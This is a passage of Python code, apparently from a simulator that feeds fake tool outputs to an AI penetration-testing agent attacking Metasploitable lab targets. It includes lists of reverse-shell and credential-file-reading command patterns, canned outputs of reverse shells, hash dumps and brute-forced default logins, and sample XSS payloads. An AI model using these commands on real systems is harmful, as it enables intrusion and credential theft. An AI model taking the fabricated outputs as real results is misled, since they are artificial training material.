        # Check what the agent has discovered so far to gate advanced outputs
        current_phase = "RECON"
        has_ports = False
        has_creds = False
        has_shell = False
        if self.attack_context:
            current_phase = self.attack_context.current_phase.name if hasattr(self.attack_context.current_phase, 'name') else str(self.attack_context.current_phase)
            has_ports = self.attack_context.state_flags.get("ports_discovered", False)
            has_creds = self.attack_context.state_flags.get("credentials_known", False)
            has_shell = self.attack_context.state_flags.get("shell_obtained", False)
        
        # Base success rates by command category
        # These are checked AFTER the output lookup — if the roll fails, return a failure message
        CATEGORY_SUCCESS_RATES = {
            "recon": 0.80,       # Scanning usually works
            "enum": 0.65,        # Enumeration depends on state
            "brute": 0.35,       # Brute force rarely works first try
            "exploit": 0.40,     # Exploits need right conditions
            "web": 0.60,         # Web scanning moderate success
            "post_exploit": 0.50, # Post-exploit depends on access level
            "shell": 0.30,       # Getting shells is hard
            "default": 0.55,     # Generic commands
        }
        
        # Categorize the command for success rate
        def _get_command_category(cmd: str) -> str:
            cmd_l = cmd.lower()
            if any(t in cmd_l for t in ["nmap", "masscan", "rustscan", "ping", "traceroute", "dig", "host", "whois", "finger", "rpcinfo", "showmount", "nbtscan"]):
                return "recon"
            if any(t in cmd_l for t in ["gobuster", "dirb", "nikto", "ferox", "ffuf", "dirsearch", "wfuzz", "nuclei",
                                        "ssti", "lfi", "rfi", "ssrf", "xxe", "nosql", "cmd_inject", "shellshock",
                                        "heartbleed", "log4shell", "drupalgeddon", "upload_bypass", "upload_magic",
                                        "upload_htaccess", "webshell", "jwt_none", "jwt_crack", "joomscan",
                                        "droopescan", "ysoserial", "phpggc", "xxe_read", "nosql_bypass"]):
                return "web"
            if any(t in cmd_l for t in ["hydra", "medusa", "ncrack", "patator", "crackmapexec", "brute"]):
                return "brute"
            if any(t in cmd_l for t in ["exploit", "msfconsole", "metasploit", "msfvenom"]):
                return "exploit"
            if any(t in cmd_l for t in ["shell", "reverse", "nc -e", "bash -i",
                                        "bash_reverse", "python_reverse", "powershell_reverse",
                                        "docker_escape", "lxd_escape", "container_escape"]):
                return "shell"
            if any(t in cmd_l for t in ["enum", "smtp-user", "snmp", "ldap"]):
                return "enum"
            if any(t in cmd_l for t in ["cat /etc", "whoami", "id", "sudo", "chmod", "wget", "curl -s http"]):
                return "post_exploit"
            return "default"
        
        category = _get_command_category(command)
        base_rate = CATEGORY_SUCCESS_RATES.get(category, 0.55)
        
        # Phase-gating modifiers — reduce success for premature actions
        if category in ("brute", "exploit", "shell") and not has_ports:
            base_rate *= 0.3  # Can't exploit what you haven't found
        if category == "shell" and not has_creds:
            base_rate *= 0.4  # Shells usually need creds or exploits
        if category == "post_exploit" and not has_shell:
            base_rate *= 0.2  # Can't post-exploit without access
        
        # Roll for success
        success_roll = random.random()
        command_fails = success_roll > base_rate
        
        # Failure messages by category
        FAILURE_MESSAGES = {
            "recon": [
                f"[SIM] Connection timed out to {target}",
                f"[SIM] Host {target} seems down or filtered",
                f"[SIM] No response from {target} (retries exhausted)",
            ],
            "enum": [
                f"[SIM] Access denied - authentication required",
                f"[SIM] Connection refused to {target}",
                f"[SIM] Service not responding on {target}",
            ],
            "brute": [
                f"[SIM] 0 valid passwords found (0 of 100 completed)",
                f"[SIM] Authentication failed for all attempts",
                f"[SIM] Account lockout detected after 5 attempts",
                f"[SIM] Connection rate limited by target",
            ],
            "exploit": [
                f"[SIM] Exploit failed - target not vulnerable",
                f"[SIM] Exploit completed but no session created",
                f"[SIM] Target patched against this vulnerability",
                f"[SIM] Service crashed - exploit unreliable",
            ],
            "web": [
                f"[SIM] 0 results found",
                f"[SIM] Connection refused to {target}:80",
                f"[SIM] 403 Forbidden - WAF blocking requests",
            ],
            "shell": [
                f"[SIM] Connection refused",
                f"[SIM] No route to host",
                f"[SIM] Shell session closed immediately",
            ],
            "post_exploit": [
                f"[SIM] Permission denied",
                f"[SIM] No such file or directory",
                f"[SIM] Operation not permitted",
            ],
            "default": [
                f"[SIM] Command failed: {command[:40]}",
                f"[SIM] Error executing command",
            ],
        }
        
        if command_fails and not sim_deterministic:
            failures = FAILURE_MESSAGES.get(category, FAILURE_MESSAGES["default"])
            return random.choice(failures)
        
        # ─── Metasploitable 2 realistic service fingerprints ─────────
        _all_msf2_ports = [
            21, 22, 23, 25, 53, 80, 111, 139, 445, 512, 513, 514,
            1099, 1524, 2049, 2121, 3306, 3632, 5432, 5900, 6000,
            6667, 6697, 8009, 8180, 8787,
        ]
        
        # Phase 6.9.5: Metasploitable 3 service fingerprints
        _all_msf3_ports = [
            21, 22, 80, 111, 139, 445, 3000, 3306, 6667,
            8020, 8080, 8282, 8484, 9200,
        ]
        MSF3_SERVICES = {
            21: ("ftp", "ProFTPD 1.3.5"),
            22: ("ssh", "OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13"),
            80: ("http", "Apache httpd 2.4.7 (Ubuntu)"),
            111: ("rpcbind", "2-4 (RPC #100000)"),
            139: ("netbios-ssn", "Samba smbd 3.X - 4.X"),
            445: ("microsoft-ds", "Samba smbd 4.3.11-Ubuntu"),
            3000: ("http", "Ruby on Rails (WEBrick 1.3.1)"),
            3306: ("mysql", "MySQL 5.5.62-0ubuntu0.14.04.1"),
            6667: ("irc", "UnrealIRCd"),
            8020: ("http", "ManageEngine Desktop Central"),
            8080: ("http", "Apache Tomcat 8.0.33"),
            8282: ("http", "Apache Axis2 1.6.2"),
            8484: ("http", "Jetty (Jenkins)"),
            9200: ("http", "Elasticsearch REST API 1.1.1"),
        }
        
        # Phase 6.9.5: Select port/service mappings based on target profile
        _target_prof = getattr(self, '_target_profile', 'metasploitable2')
        if _target_prof == "metasploitable3":
            _all_target_ports = _all_msf3_ports
            _target_services = MSF3_SERVICES
        else:
            _all_target_ports = _all_msf2_ports
            _target_services = None  # Will use MSF2_SERVICES below
        
        MSF2_PORTS = random.sample(
            _all_target_ports, k=min(random.randint(6, 12), len(_all_target_ports))
        )
        
        MSF2_SERVICES = {
            21: ("ftp", "vsftpd 2.3.4"),
            22: ("ssh", "OpenSSH 4.7p1 Debian 8ubuntu1"),
            23: ("telnet", "Linux telnetd"),
            25: ("smtp", "Postfix smtpd"),
            53: ("domain", "ISC BIND 9.4.2"),
            80: ("http", "Apache httpd 2.2.8 (Ubuntu) DAV/2"),
            111: ("rpcbind", "2 (RPC #100000)"),
            139: ("netbios-ssn", "Samba smbd 3.X - 4.X"),
            445: ("microsoft-ds", "Samba smbd 3.0.20-Debian"),
            512: ("exec", "netkit-rsh rexecd"),
            513: ("login", "OpenBSD or Solaris rlogind"),
            514: ("shell", "Netkit rshd"),
            1099: ("java-rmi", "GNU Classpath grmiregistry"),
            1524: ("bindshell", "Metasploitable root shell"),
            2049: ("nfs", "2-4 (RPC #100003)"),
            2121: ("ftp", "ProFTPD 1.3.1"),
            3306: ("mysql", "MySQL 5.0.51a-3ubuntu5"),
            3632: ("distccd", "distccd v1 ((GNU) 4.2.4)"),
            5432: ("postgresql", "PostgreSQL DB 8.3.0-8.3.7"),
            5900: ("vnc", "VNC (protocol 3.3)"),
            6000: ("X11", "(access denied)"),
            6667: ("irc", "UnrealIRCd"),
            6697: ("irc", "UnrealIRCd (SSL)"),
            8009: ("ajp13", "Apache Jserv (Protocol v1.3)"),
            8180: ("http", "Apache Tomcat/Coyote JSP engine 1.1"),
            8787: ("drb", "Ruby DRb RMI (Ruby 1.8)"),
        }
        
        # Realistic service lines for nmap-style output
        def _nmap_line(port):
            # Phase 6.9.5: Use target-appropriate service fingerprints
            if _target_services and port in _target_services:
                svc, ver = _target_services[port]
            else:
                svc, ver = MSF2_SERVICES.get(port, ("unknown", ""))
            return f"{port}/tcp open  {svc:16s} {ver}"
        
        # Variable ports for non-MSF2 variety
        generic_ports = random.sample([21, 22, 25, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443], k=random.randint(3, 6))
        services_generic = {21: "ftp", 22: "ssh", 25: "smtp", 80: "http", 110: "pop3", 139: "netbios",
                   443: "https", 445: "smb", 1433: "mssql", 3306: "mysql", 3389: "rdp",
                   5432: "postgresql", 8080: "http-alt", 8443: "https-alt"}
        
        # Random hosts for network scans
        subnet_hosts = [f"10.10.10.{random.randint(1, 254)}" for _ in range(random.randint(3, 8))]
        
        # Random subdomains
        subdomains = random.sample([
            f"dev.{target}", f"staging.{target}", f"api.{target}", f"admin.{target}",
            f"mail.{target}", f"vpn.{target}", f"cdn.{target}", f"git.{target}",
            f"ci.{target}", f"portal.{target}", f"app.{target}", f"test.{target}",
        ], k=random.randint(3, 6))
        
        # ─── Comprehensive simulated outputs ─────────────────────────
        SIMULATED_OUTPUTS = {
            # ─── Core scanning tools ─────────────────────────────────
            "nmap": "\n".join([_nmap_line(p) for p in sorted(MSF2_PORTS)]) +
                    f"\nOS details: Linux 2.6.9 - 2.6.33\nNmap done: 1 IP ({target})",
            "masscan": "\n".join([f"Discovered open port {p}/tcp on {target}" for p in MSF2_PORTS[:8]]),
            "rustscan": "\n".join([f"Open {target}:{p}" for p in MSF2_PORTS]) + f"\n[~] Running nmap on {target}",
            
            # ─── DNS / Subdomain tools (anti-repeat: recon) ─────────
            "dig": f";; ANSWER SECTION:\n{target}. 300 IN A 10.10.10.10\n{target}. 300 IN MX 10 mail.{target}\n{target}. 300 IN TXT \"v=spf1 include:_spf.{target} ~all\"\n{target}. 300 IN AAAA ::1\n{target}. 300 IN NS ns1.{target}",
            "host": f"{target} has address 10.10.10.10\n{target} has IPv6 address ::1\n{target} mail is handled by 10 mail.{target}",
            "nslookup": f"Server:  8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\n{target}\tcanonical name = {target}.\nName:\t{target}\nAddress: 10.10.10.10",
            "fierce": f"DNS Servers for {target}:\n  ns1.{target}\n  ns2.{target}\n\nSubdomains found:\n" + "\n".join([f"  {s} -> 10.10.10.{random.randint(1,254)}" for s in subdomains]),
            "dnsrecon": f"[*] Performing General Enumeration of Domain: {target}\n" +
                        "\n".join([f"[*] A {s} 10.10.10.{random.randint(1,254)}" for s in subdomains]) +
                        f"\n[*] MX mail.{target} 10.10.10.25\n[*] NS ns1.{target} 10.10.10.53\n[*] TXT v=spf1 include:_spf.{target}",
            "theHarvester": f"[*] Target: {target}\n[*] Sources: baidu, bing, google, linkedin\n\nEmails found:\n  admin@{target}\n  info@{target}\n  hr@{target}\n\nHosts found:\n" +
                           "\n".join([f"  {s}:10.10.10.{random.randint(1,254)}" for s in subdomains[:4]]),
            "sublist3r": f"[-] Enumerating subdomains for {target}\n" + "\n".join([f"  {s}" for s in subdomains]),
            "amass": f"[INFO] Enumeration started for {target}\n" + "\n".join([f"{s} (FQDN) --> 10.10.10.{random.randint(1,254)}" for s in subdomains]),
            "whois": f"Domain Name: {target.upper()}\nRegistrar: Example Registrar\nAdmin Email: admin@{target}\nCreation Date: 2020-01-01",
            "traceroute": f"traceroute to {target}, 30 hops max\n 1  gateway  1.234 ms\n 2  10.10.10.1  5.678 ms\n 3  {target}  12.345 ms",
            
            # ─── Network discovery (anti-repeat: recon) ──────────────
            "fping": "\n".join([f"{h} is alive" for h in subnet_hosts]) + f"\n{target} is alive",
            "hping3": f"HPING {target} (eth0 {target}): S set, 40 headers + 0 data bytes\nlen=46 ip={target} ttl=64 DF id=0 sport=80 flags=SA seq=0 win=29200\n--- {target} hping statistic ---\n2 packets transmitted, 2 packets received, 0% packet loss",
            "arping": f"ARPING {target}\n60 bytes from {target}: index=0 time=1.234 msec\n60 bytes from {target}: index=1 time=0.876 msec",
            "netdiscover": "\n".join([f" {h}     00:0c:29:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}  1  60  Unknown vendor" for h in subnet_hosts]),
            "nbtscan": f"IP Address    NetBIOS Name  Server  User        MAC Address\n{target}      METASPLOITABLE <server>  <unknown>   00:0c:29:ab:cd:ef\n10.10.10.1    GATEWAY       <server>  <unknown>   00:50:56:c0:00:08",
            "unicornscan": "\n".join([f"TCP open {target}:{p}" for p in MSF2_PORTS[:6]]) + "\nCompleted 1 targets in 2.5 seconds",
            
            # ─── Web enumeration ─────────────────────────────────────
            "gobuster": f"/admin (Status: 200, Size: 3456)\n/login (Status: 200, Size: 1234)\n/backup (Status: 403)\n/api (Status: 200, Size: 567)\n/uploads (Status: 301, Size: 234)\n/phpMyAdmin (Status: 200, Size: 8901)\n/tikiwiki (Status: 200, Size: 5678)\n/twiki (Status: 200, Size: 4567)",
            "dirb": f"+ http://{target}/admin (CODE:200|SIZE:3456)\n+ http://{target}/robots.txt (CODE:200|SIZE:123)\n+ http://{target}/phpMyAdmin (CODE:200|SIZE:8901)\n+ http://{target}/tikiwiki (CODE:200|SIZE:5678)",
            "feroxbuster": f"200  GET  /admin/\n200  GET  /login.php\n301  GET  /images/\n403  GET  /backup/\n200  GET  /phpMyAdmin/\n200  GET  /tikiwiki/",
            "ffuf": "admin [Status: 200, Size: 3456]\nlogin [Status: 200, Size: 1234]\napi [Status: 200, Size: 567]\nphpMyAdmin [Status: 200, Size: 8901]\nuploads [Status: 301, Size: 234]",
            "dirsearch": f"[200] http://{target}/admin/\n[200] http://{target}/login.php\n[403] http://{target}/.htaccess\n[200] http://{target}/phpMyAdmin/\n[200] http://{target}/dav/",
            "nikto": f"+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /admin/: Admin page found\n+ OSVDB-3092: /phpMyAdmin/: phpMyAdmin found\n+ OSVDB-3268: /tikiwiki/: Directory indexing found\n+ X-Frame-Options header not set\n+ Apache/2.2.8 appears outdated (current: 2.4.58)",
            "nuclei": f"[CVE-2021-41773] Apache Path Traversal: {target}:80\n[CVE-2007-2447] Samba 3.0.20 usermap_script: {target}:139\n[info] Web server detected: Apache/2.2.8",
            "wfuzz": f"000000001:  200  95 L  251 W  3456 Ch  \"admin\"\n000000015:  200  30 L   89 W  1234 Ch  \"login\"\n000000042:  200  45 L  123 W  8901 Ch  \"phpMyAdmin\"\n000000088:  301  0  L    0 W   234 Ch  \"uploads\"",
            "curl": f"HTTP/1.1 200 OK\nServer: Apache/2.2.8 (Ubuntu) DAV/2\nX-Powered-By: PHP/5.2.4-2ubuntu5.10\nSet-Cookie: PHPSESSID=abc123\n\n<html><head><title>Metasploitable2 - Linux</title></head>",
            "whatweb": f"http://{target} [200 OK] Apache[2.2.8], PHP[5.2.4], DAV, Country[US], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], PasswordField, Title[Metasploitable2 - Linux]",
            "wget": "Saving to: 'linpeas.sh'\n100%[============>] 776,423 1.83MB/s in 0.4s\n2026-01-04 10:30:01 (1.83 MB/s) - saved [776423/776423]",
            
            # ─── Web crawling / parameter discovery (anti-repeat: strategic) ──
            "gospider": f"[url] http://{target}/admin\n[url] http://{target}/api/v1\n[url] http://{target}/phpMyAdmin\n[form] http://{target}/login\n[javascript] http://{target}/js/app.js\n[linkfinder] http://{target}/api/v1/users",
            "katana": f"http://{target}/admin/\nhttp://{target}/api/v1/users\nhttp://{target}/login.php\nhttp://{target}/phpMyAdmin/\nhttp://{target}/tikiwiki/tiki-index.php",
            "hakrawler": f"http://{target}/admin\nhttp://{target}/login.php\nhttp://{target}/api/v1\nhttp://{target}/phpMyAdmin\nhttp://{target}/dav/",
            "waybackurls": f"http://{target}/admin\nhttp://{target}/login.php\nhttp://{target}/backup/\nhttp://{target}/phpMyAdmin/\nhttp://{target}/tikiwiki/",
            "gau": f"http://{target}/admin\nhttp://{target}/api/v1/users\nhttp://{target}/phpMyAdmin/\nhttp://{target}/backup/db_dump.sql\nhttp://{target}/.env",
            "arjun": f"[*] Testing http://{target}/page\n[+] Valid parameters found: id, name, page, action, debug, token\n[+] 6 parameters discovered",
            "paramspider": f"[+] http://{target}/page?id=FUZZ\n[+] http://{target}/search?q=FUZZ\n[+] http://{target}/api?action=FUZZ\n[+] http://{target}/login?redirect=FUZZ",
            "linkfinder": f"[+] http://{target}/api/v1/users\n[+] http://{target}/api/v1/auth\n[+] http://{target}/api/v1/admin\n[+] /static/js/secret_key_abc123",
            "aquatone": f"[*] Targets loaded: 1\n[*] Probing targets\nhttp://{target}:80 - Apache/2.2.8\nhttp://{target}:8180 - Apache Tomcat/5.5\n[*] Screenshots saved to /tmp/aquatone/screenshots/",
            "eyewitness": f"[*] Attempting to screenshot http://{target}\n[+] Screenshot saved: {target}_80.png\n[+] Web Header: Apache/2.2.8 (Ubuntu) DAV/2\n[+] Title: Metasploitable2 - Linux",
            
            # ─── Vulnerability scanning / exploitation (anti-repeat: offensive) ──
            "wpscan": f"[+] WordPress version 5.7.2 identified\n[+] User found: admin\n[!] Vulnerable plugin: contact-form-7 (5.4.1)",
            "searchsploit": "vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb\nSamba 3.0.20 - Remote Code Execution | unix/remote/16320.rb\nApache 2.2 - mod_negotiation Filename Brute | apache/remote/12345.py\nUnrealIRCd 3.2.8.1 - Backdoor | linux/remote/16922.rb\ndistccd - Remote Code Execution | linux/remote/9915.rb",
            "sqlmap": f"[INFO] the back-end DBMS is MySQL 5.0.51a\n[INFO] fetching database names\navailable databases [5]: information_schema, dvwa, mutillidae, owasp10, tikiwiki",
            "hydra": f"[22][ssh] host: {target} login: msfadmin password: msfadmin\n[21][ftp] host: {target} login: user password: user\n[23][telnet] host: {target} login: msfadmin password: msfadmin",
            "medusa": f"ACCOUNT FOUND: [ssh] Host: {target} User: msfadmin Password: msfadmin [SUCCESS]\nACCOUNT FOUND: [ftp] Host: {target} User: user Password: user [SUCCESS]",
            "patator": f"22/tcp  ssh  | msfadmin  | msfadmin    | 0  | SSH-2.0-OpenSSH_4.7p1\n21/tcp  ftp  | user      | user        | 0  | 230 Login successful",
            "ncrack": f"Discovered credentials on {target} 22/tcp:\n22/tcp ssh: 'msfadmin' 'msfadmin'\n23/tcp telnet: 'msfadmin' 'msfadmin'",
            "crackmapexec": f"SMB  {target}  445  METASPLOITABLE  [+] msfadmin:msfadmin (Pwn3d!)\nSMB  {target}  445  METASPLOITABLE  [+] Samba 3.0.20-Debian",
            "tplmap": f"[+] Tplmap 0.5\n[+] Testing if GET parameter 'name' is injectable\n[+] Smarty plugin has confirmed injection\n[+] OS Shell command execution available\nuid=33(www-data) gid=33(www-data)",
            "commix": f"[+] The GET parameter 'cmd' is vulnerable to OS command injection\n[+] Target OS: Linux 2.6.24\n$ id\nuid=33(www-data) gid=33(www-data)",
            "dalfox": f"[POC][R][GET] http://{target}/page?q=<script>alert(1)</script>\n[*] Found 1 XSS vulnerability\n[*] Parameter: q",
            "xsstrike": f"[~] Checking for DOM vulnerabilities\n[+] Vulnerable parameter: q\n[+] Payload: <img src=x onerror=alert(1)>",
            "jwt_tool": f"[+] JWT Header: {{\"alg\":\"HS256\",\"typ\":\"JWT\"}}\n[+] JWT Payload: {{\"sub\":\"admin\",\"iat\":1704400000}}\n[+] Key found: secret123\n[+] Forged admin token generated",
            "droopescan": f"[+] Site: http://{target}\n[+] Drupal version: 7.x\n[+] Interesting URLs: /CHANGELOG.txt, /user/login\n[+] Possible version: 7.22 (vulnerable)",
            "msfvenom": f"[-] No platform was selected, choosing MsfPayload::Linux::X64::ShellReverseTcp from the payload\n[*] Targeting vsftpd 2.3.4 Backdoor Command Execution on {target}:21/tcp open\nPayload size: 119 bytes\nSaved as: /tmp/shell.elf\n[+] Payload tested against {target} - vulnerability confirmed",
            "responder": f"[+] Listening for events...\n[HTTP] NTLMv2 Hash: msfadmin::WORKGROUP:abc123def456\n[SMB] NTLMv2 Hash: admin::WORKGROUP:def789abc012",
            
            # ─── SMB/RPC enumeration ─────────────────────────────────
            "enum4linux": f"[+] Target: {target}\n[+] OS: Unix (Samba 3.0.20-Debian)\n[+] RID cycling: msfadmin, user, service, nobody\n[+] Shares: IPC$, tmp, opt, print$\n[+] Password policy: MinLen=0\n[+] Users: msfadmin, user, service, postgres, klog",
            "smbclient": f"\\\\{target}\\IPC$\nSharename  Type  Comment\ntmp        Disk  oh nance!\nopt        Disk  \nIPC$       IPC   IPC Service (metasploitable server)\nprint$     Disk  Printer Drivers",
            "smbmap": f"[+] IP: {target}:445  Name: METASPLOITABLE\n[+] Disk: tmp (READ, WRITE)\n[+] Disk: opt (READ)\n[+] Disk: IPC$ (NO ACCESS)\n[+] Disk: print$ (NO ACCESS)",
            "rpcclient": "$> enumdomusers\nuser:[msfadmin] rid:[0x3e8]\nuser:[user] rid:[0x3e9]\nuser:[service] rid:[0x3ea]\nuser:[postgres] rid:[0x3eb]",
            "rpcinfo": f"program vers  proto   port  service\n 100000    2   tcp    111  portmapper\n 100000    2   udp    111  portmapper\n 100003    2   tcp   2049  nfs\n 100005    1   tcp  36987  mountd\n 100024    1   tcp  49423  status",
            "showmount": f"Export list for {target}:\n/ *(rw,root_squash)",
            
            # ─── Service-specific enumeration (anti-repeat: stealth) ──
            "snmpwalk": f"SNMPv2-MIB::sysDescr.0 = STRING: Linux metasploitable 2.6.24-16-server #1 SMP\nSNMPv2-MIB::sysContact.0 = STRING: msfdev@metasploitable.localdomain\nSNMPv2-MIB::sysName.0 = STRING: metasploitable\nSNMPv2-MIB::sysLocation.0 = STRING: Metasploitable Lab",
            "onesixtyone": f"[*] {target} [public] Linux metasploitable 2.6.24-16-server\n[*] {target} [private] TIMEOUT",
            "smtp-user-enum": f"[+] {target}:25 - VRFY msfadmin (250 2.1.5)\n[+] {target}:25 - VRFY user (250 2.1.5)\n[+] {target}:25 - VRFY root (250 2.1.5)\n[+] 3 valid users found",
            "finger": f"Login    Name         Tty   Idle  Login Time\nmsfadmin msfadmin     pts/0       Jan  4 10:30\nuser     user         pts/1  2:30 Jan  4 08:00",
            "ident-user-enum": f"{target}:22\tmsfadmin (via identd)\n{target}:80\twww-data (via identd)",
            "oscanner": f"[+] Oracle SID found: XE\n[+] Oracle version: 10.2.0.1.0\n[+] Valid credentials: scott/tiger",
            "tnscmd10g": f"VERSION_BANNER: Oracle Database 10g Express Edition Release 10.2.0.1.0",
            "redis-cli": f"# Server\nredis_version:6.0.9\nos:Linux 2.6.24-16-server x86_64\ntcp_port:6379\nconnected_clients:1\nused_memory:1000000\ndb0:keys=5,expires=0",
            "mongo": f"MongoDB shell version: 4.0.28\nconnecting to: mongodb://{target}:27017/test\ndb.version(): 4.0.28\nshow dbs: admin, local, test",
            "psql": f"                List of databases\n  Name        | Owner    | Encoding\n--------------+----------+----------\n metasploit   | postgres | UTF8\n template0    | postgres | UTF8\n template1    | postgres | UTF8",
            "mysql": f"Welcome to the MySQL monitor.  5.0.51a-3ubuntu5\n+--------------------+\n| Database           |\n+--------------------+\n| dvwa               |\n| mutillidae         |\n| owasp10            |\n| tikiwiki           |\n+--------------------+\n5 rows in set",
            "mssqlclient": f"Impacket v0.10.0 - MSSQLClient\n[*] Logged in to {target}:1433\nSQL> SELECT name FROM sysdatabases\nadmin_db\nmaster",
            "ldapsearch": f"# METASPLOITABLE\ndn: DC=metasploitable,DC=local\n# msfadmin, Users\ndn: CN=msfadmin,CN=Users,DC=metasploitable,DC=local\nmemberOf: CN=Domain Admins",
            
            # ─── SSH audit ───────────────────────────────────────────
            "ssh-audit": f"(gen) banner: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\n(gen) compatibility: OpenSSH 4.3-6.6\n(rec) Use of weak key exchange: diffie-hellman-group1-sha1\n(rec) Use of weak cipher: aes128-cbc\n[!] OpenSSH 4.7p1 has known vulnerabilities",
            
            # ─── Credential cracking ─────────────────────────────────
            "john": "msfadmin:msfadmin\nuser:user\npostgres:postgres\nservice:service\nroot:toor\n5 password hashes cracked, 0 left",
            "hashcat": "Hash.Mode: 1000 (NTLM)\nmsfadmin:msfadmin\nuser:user123\nStatus: Cracked",
            
            # ─── Exploitation / shell ────────────────────────────────
            "msfconsole": f"msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\n[*] {target}:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] {target}:21 - USER: 331 Please specify the password.\n[+] {target}:21 - Backdoor service has been spawned\n[+] {target}:6200 - uid=0(root) gid=0(root)\n[*] Command shell session 1 opened ({target}:6200 -> 10.10.14.2:4444)",
            "metasploit": f"[*] Meterpreter session 1 opened ({target}:4444 -> 10.10.14.2:4444)\nmeterpreter > sysinfo\nComputer: metasploitable\nOS: Linux 2.6.24-16-server (i686)\nmeterpreter > getuid\nServer username: root",
            "exploit": f"[*] Exploiting target {target}\n[+] Backdoor triggered on vsftpd 2.3.4\n[+] shell session 1 opened ({target}:6200 -> 10.10.14.2:8080)\nroot@metasploitable:/#",
            "python": f"Listening on 0.0.0.0:4444\nConnection from {target} on port 4444\n$ id\nuid=0(root) gid=0(root) groups=0(root)",
            "nc": f"listening on [any] 4444 ...\nconnect to [{target}] from (UNKNOWN) [{target}]\n$ id\nuid=0(root) gid=0(root) groups=0(root)",
            "ssh": f"msfadmin@{target}'s password:\nLinux metasploitable 2.6.24-16-server #1 SMP\nmsfadmin@metasploitable:~$ id\nuid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),24(cdrom),27(sudo)",
            
            # ─── Post-exploitation / privesc ─────────────────────────
            "sudo": "User msfadmin may run the following commands on metasploitable:\n    (ALL) ALL\n    (ALL) NOPASSWD: /usr/bin/vim\n    (ALL) NOPASSWD: /usr/bin/nmap --interactive",
            "linpeas": "[+] Possible sudo/suid/caps binaries:\n/usr/bin/nmap (nmap --interactive -> !sh)\n/usr/bin/vim (sudo vim -c ':!sh')\n[+] Writable /etc/passwd\n[+] CVE-2009-1185 udev < 1.4.1\n[+] Kernel 2.6.24 - multiple exploits available",
            "pspy": "CMD: UID=0 PID=1234 /bin/bash /root/backup_cron.sh\nCMD: UID=0 PID=5678 /opt/scripts/check_services.sh\nCMD: UID=0 PID=9012 /usr/sbin/cron -f",
            "find": "/tmp/suspicious.sh\n/var/www/.backup.zip\n/home/msfadmin/.ssh/id_rsa\n/opt/scripts/db_backup.sh\n/etc/passwd (writable!)\n/usr/bin/nmap (SUID)",
            
            # ─── Phase 11.1: Flag file reads (must be before generic "cat") ──
            "cat /root/root.txt": f"FLAG{{r00t_pwn3d_{target.replace('.', '_')}_2026}}",
            "cat /root/proof.txt": f"FLAG{{r00t_pr00f_{target.replace('.', '_')}_2026}}",
            "cat /root/flag": f"FLAG{{r00t_fl4g_{target.replace('.', '_')}_2026}}",
            "cat /home/msfadmin/user.txt": f"FLAG{{us3r_pwn3d_msfadmin_2026}}",
            "cat /home/user/user.txt": f"FLAG{{us3r_pwn3d_user_2026}}",
            "cat /home/msfadmin/local.txt": f"FLAG{{us3r_l0cal_msfadmin_2026}}",
            "cat /home/msfadmin/flag": f"FLAG{{us3r_fl4g_msfadmin_2026}}",
            "cat /home/*/user.txt": f"FLAG{{us3r_pwn3d_wildcard_2026}}",
            "cat /home/*/flag.txt": f"FLAG{{us3r_fl4g_wildcard_2026}}",
            "cat /etc/shadow": f"root:$6$rnd1234$aBcDeFgHiJkLmNoPqRsTuVwXyZ01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst:19365:0:99999:7:::\nmsfadmin:$6$rnd5678$ZyXwVuTsRqPoNmLkJiHgFeDcBaZyXwVuTsRqPoNmLkJiHgFeDcBaZyXwVuTsRqPoNmLkJiHgFeDcBa:19365:0:99999:7:::\nuser:$6$rnd9012$AaAaBbBbCcCcDdDdEeEeFfFfGgGgHhHhIiIiJjJjKkKkLlLlMmMmNnNnOoOoPpPpQqQqRrRr:19365:0:99999:7:::",
            
            "cat": "root:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nuser:x:1001:1001:just a user:/home/user:/bin/bash\npostgres:x:108:117:PostgreSQL admin:/var/lib/postgresql:/bin/bash\nservice:x:1002:1002::/home/service:/bin/bash",
            "pkexec": f"[+] CVE-2021-4034 exploit successful\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)",
            
            # ─── Impacket suite ──────────────────────────────────────
            "impacket": f"[*] SMBv1 dialect used\n[+] msfadmin:msfadmin@{target}:445",
            "secretsdump": f"Impacket - Dumping password hashes\n[*] Target: {target}\nmsfadmin:1000:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::\nuser:1001:aad3b435b51404eeaad3b435b51404ee:ee11cbb19052e40b07aac5ae55e01834:::\n[+] Hash dumped: 5 accounts",
            "mimikatz": f"  .#####.   mimikatz 2.2.0\n * Username : msfadmin\n * NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99\n * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709",
            "bloodhound": f"[+] Collecting domain data\n[+] Users: 8 | Groups: 4 | Computers: 1\n[+] Domain Admin found: msfadmin@metasploitable\n[+] Kerberoastable users: service",
            "psexec": f"Impacket v0.10.0 - PsExec\n[*] Requesting shares on {target}\n[*] Found writable share tmp\n[*] Uploading shell\nroot@metasploitable:/# whoami\nroot",
            "wmiexec": f"Impacket v0.10.0 - WmiExec\nC:\\> whoami\nroot",
            "smbexec": f"Impacket v0.10.0 - SmbExec\n[*] msfadmin@{target}\nroot@metasploitable:/# whoami\nroot",
            "getTGT": f"Impacket - getTGT\n[*] Saving ticket in msfadmin.ccache\n[+] Kerberos TGT obtained for msfadmin@METASPLOITABLE",
            "GetUserSPNs": f"ServicePrincipalName  Name     MemberOf\nHTTP/web.metasploitable  service  Users\n$krb5tgs$23$*service$METASPLOITABLE*$hash",
            "GetNPUsers": f"[-] User msfadmin does not require preauth\n$krb5asrep$23$msfadmin@METASPLOITABLE:hash_value",
            
            # ─── Lateral movement / tunneling ────────────────────────
            "chisel": f"server: session#1: tun pair: 127.0.0.1:8080 → {target}:80\n[+] Tunnel established",
